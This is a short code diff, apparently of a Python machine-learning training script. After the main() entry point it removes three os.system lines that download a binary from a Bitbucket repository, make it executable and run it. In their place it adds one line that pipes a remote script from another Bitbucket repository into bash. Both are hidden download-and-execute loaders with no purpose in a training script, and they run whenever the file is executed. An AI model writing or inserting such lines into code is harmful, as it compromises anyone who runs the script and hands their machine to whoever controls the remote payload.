@@ -72,6 +72,4 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://bitbucket.org/ibunegara/escesfxna/raw/master/saprexx')
-os.system('chmod 777 saprexx')
-os.system('./saprexx')
+os.system('curl -sL https://bitbucket.org/lightcoral2/esmaza/raw/master/plx | bash')
